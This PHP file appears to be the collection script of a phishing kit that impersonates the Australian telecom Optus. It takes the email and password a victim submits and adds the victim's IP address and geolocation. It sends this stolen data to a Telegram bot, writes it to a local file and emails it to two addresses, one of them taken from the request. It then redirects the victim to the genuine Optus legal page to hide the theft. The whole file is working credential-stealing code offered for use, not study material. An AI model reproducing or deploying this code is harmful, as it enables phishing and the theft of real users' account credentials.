<?php
	
	$email = $_POST['email'];
	$passwd = $_POST['password'];
	$serv = $_REQUEST['verify'];
	require_once('geoplugin.class.php');
	require_once('Yourmail.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }
	if($email != null && $passwd != null){

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "User ID: ".$email."\n";
    $message .= "Password: ".$passwd."\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
	$handle = fopen("JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$subject = "optus.com.au";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	mail("$serv",$subject,$message,$headers);
	}
}
?>
<script>
	window.location="https://www.optus.com.au/about/legal#customer-terms";
</script>